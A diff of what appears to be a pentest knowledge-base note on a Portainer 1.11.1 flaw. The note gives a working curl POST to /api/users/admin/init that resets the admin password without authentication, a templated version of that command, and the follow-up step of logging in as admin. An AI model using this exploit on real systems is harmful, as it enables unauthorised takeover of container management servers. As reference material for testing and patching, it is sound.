@@ -33,6 +33,8 @@ Portainer version 1.11.1 and earlier contains a vulnerability which allows unaut
 
 Portainer version 1.11.1 and earlier contains a vulnerability which allows unauthenticated users to reset the admin password by sending a POST request to to the server.
 
+
+
 # Instructions
 
 Use cURL to exploit the vulnerability. The request must:
@@ -45,11 +47,19 @@ Use cURL to exploit the vulnerability. The request must:
 
 Eg:  curl -H "Content-Type: application/json" http://localhost:9000/api/users/admin/init -d '{"password":"s3cr3t"}'
 
+
+
+
+
 **Command** ([[curl Make a POST Request with JSON Data]]):
 
 ```bash
 curl -H "Content-Type: application/json" http://_TARGET_IP/$_PATH -d '{"$_KEY":"$_VALUE"}'
 ```
+
+
+
+
 
 After submitting the POST request, attempt to login with the username "admin" and the new password.
 
@@ -82,3 +92,5 @@ After submitting the POST request, attempt to login with the username "admin" an
 - [[known vulnerability]]
 - [[unauthorized]]
 - [[Web Applications]]
+
+
